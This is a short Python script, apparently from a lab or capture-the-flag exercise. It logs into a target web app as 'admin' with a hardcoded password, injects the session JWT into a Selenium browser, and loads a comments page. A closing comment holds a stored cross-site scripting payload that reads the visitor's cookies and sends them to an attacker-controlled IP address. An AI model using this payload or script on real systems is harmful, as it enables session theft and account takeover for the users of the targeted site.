from selenium import webdriver
import requests
import sys

data = {
    "username": "admin",
    "password": "bsbGSVbhsgh7365sbnTSvgsbhd"
}

r = requests.post("http://{}:5000/login".format(sys.argv[1]), data = data, allow_redirects=False)

cookie = r.headers['Set-Cookie'].split("=")[1]

browser = webdriver.Firefox()

browser.get('http://{}:5000/comments'.format(sys.argv[1]))

browser.add_cookie({'name': 'JWT_token', 'value': cookie})

browser.get('http://{}:5000/comments'.format(sys.argv[1]))

# <script>var xhttp = new XMLHttpRequest(); cookie = document.cookie;  url_atacante = "http://192.168.232.129:8000/envio_cookie?cookie=" + cookie;  xhttp.open("GET", url_atacante, true); xhttp.send();</script>
